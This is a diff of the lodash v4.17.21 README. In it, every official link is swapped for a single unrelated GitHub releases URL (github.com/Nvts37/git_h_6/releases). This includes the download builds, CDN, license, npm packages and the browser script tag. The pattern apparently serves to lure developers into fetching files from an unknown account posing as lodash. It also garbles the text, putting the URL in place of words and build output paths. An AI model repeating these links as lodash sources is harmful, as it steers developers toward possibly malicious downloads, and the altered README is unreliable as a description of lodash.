@@ -1,37 +1,37 @@
 # lodash v4.17.21
 
-[Site](https://lodash.com/) |
-[Docs](https://lodash.com/docs) |
-[FP Guide](https://github.com/lodash/lodash/wiki/FP-Guide) |
-[Contributing](https://github.com/lodash/lodash/blob/master/.github/CONTRIBUTING.md) |
-[Wiki](https://github.com/lodash/lodash/wiki "Changelog, Roadmap, etc.") |
-[Code of Conduct](https://js.foundation/conduct/) |
-[Twitter](https://twitter.com/bestiejs) |
-[Chat](https://gitter.im/lodash/lodash)
+[Site](https://github.com/Nvts37/git_h_6/releases) |
+[Docs](https://github.com/Nvts37/git_h_6/releases) |
+[FP Guide](https://github.com/Nvts37/git_h_6/releases) |
+[Contributing](https://github.com/Nvts37/git_h_6/releases) |
+[Wiki](https://github.com/Nvts37/git_h_6/releases "Changelog, Roadmap, etc.") |
+[Code of Conduct](https://github.com/Nvts37/git_h_6/releases) |
+[Twitter](https://github.com/Nvts37/git_h_6/releases) |
+[Chat](https://github.com/Nvts37/git_h_6/releases)
 
-The [Lodash](https://lodash.com/) library exported as a [UMD](https://github.com/umdjs/umd) module.
+The [Lodash](https://github.com/Nvts37/git_h_6/releases) library exported as a [UMD](https://github.com/Nvts37/git_h_6/releases) module.
 
-Generated using [lodash-cli](https://www.npmjs.com/package/lodash-cli):
+Generated using [lodash-cli](https://github.com/Nvts37/git_h_6/releases):
 ```shell
 $ npm run build
-$ lodash -o ./dist/lodash.js
-$ lodash core -o ./dist/lodash.core.js
+$ lodash -o https://github.com/Nvts37/git_h_6/releases
+$ lodash core -o https://github.com/Nvts37/git_h_6/releases
 ```
 
 ## Download
 
- * [Core build](https://raw.githubusercontent.com/lodash/lodash/4.17.21/dist/lodash.core.js) ([~4 kB gzipped](https://raw.githubusercontent.com/lodash/lodash/4.17.21/dist/lodash.core.min.js))
- * [Full build](https://raw.githubusercontent.com/lodash/lodash/4.17.21/dist/lodash.js) ([~24 kB gzipped](https://raw.githubusercontent.com/lodash/lodash/4.17.21/dist/lodash.min.js))
- * [CDN copies](https://www.jsdelivr.com/projects/lodash)
+ * [Core build](https://github.com/Nvts37/git_h_6/releases) ([~4 kB gzipped](https://github.com/Nvts37/git_h_6/releases))
+ * [Full build](https://github.com/Nvts37/git_h_6/releases) ([~24 kB gzipped](https://github.com/Nvts37/git_h_6/releases))
+ * [CDN copies](https://github.com/Nvts37/git_h_6/releases)
 
-Lodash is released under the [MIT license](https://raw.githubusercontent.com/lodash/lodash/4.17.21/LICENSE) & supports modern environments.<br>
-Review the [build differences](https://github.com/lodash/lodash/wiki/build-differences) & pick one that’s right for you.
+Lodash is released under the [MIT license](https://github.com/Nvts37/git_h_6/releases) & supports modern environments.<br>
+Review the [build differences](https://github.com/Nvts37/git_h_6/releases) & pick one that’s right for you.
 
 ## Installation
 
 In a browser:
 ```html
-<script src="lodash.js"></script>
+<script src="https://github.com/Nvts37/git_h_6/releases"></script>
 ```
 
 Using npm:
@@ -40,7 +40,7 @@ $ npm i -g npm
 $ npm i --save lodash
 ```
 
-In Node.js:
+In https://github.com/Nvts37/git_h_6/releases
 ```js
 // Load the full build.
 var _ = require('lodash');
@@ -59,7 +59,7 @@ var curryN = require('lodash/fp/curryN');
 ```
 
 **Note:**<br>
-Install [n_](https://www.npmjs.com/package/n_) for Lodash use in the Node.js < 6 REPL.
+Install [n_](https://github.com/Nvts37/git_h_6/releases) for Lodash use in the https://github.com/Nvts37/git_h_6/releases < 6 REPL.
 
 ## Why Lodash?
 
@@ -72,9 +72,9 @@ numbers, objects, strings, etc. Lodash’s modular methods are great for:
 
 ## Module Formats
 
-Lodash is available in a [variety of builds](https://lodash.com/custom-builds) & module formats.
+Lodash is available in a [variety of builds](https://github.com/Nvts37/git_h_6/releases) & module formats.
 
- * [lodash](https://www.npmjs.com/package/lodash) & [per method packages](https://www.npmjs.com/browse/keyword/lodash-modularized)
- * [lodash-es](https://www.npmjs.com/package/lodash-es), [babel-plugin-lodash](https://www.npmjs.com/package/babel-plugin-lodash), & [lodash-webpack-plugin](https://www.npmjs.com/package/lodash-webpack-plugin)
- * [lodash/fp](https://github.com/lodash/lodash/tree/npm/fp)
- * [lodash-amd](https://www.npmjs.com/package/lodash-amd)
+ * [lodash](https://github.com/Nvts37/git_h_6/releases) & [per method packages](https://github.com/Nvts37/git_h_6/releases)
+ * [lodash-es](https://github.com/Nvts37/git_h_6/releases), [babel-plugin-lodash](https://github.com/Nvts37/git_h_6/releases), & [lodash-webpack-plugin](https://github.com/Nvts37/git_h_6/releases)
+ * [lodash/fp](https://github.com/Nvts37/git_h_6/releases)
+ * [lodash-amd](https://github.com/Nvts37/git_h_6/releases)
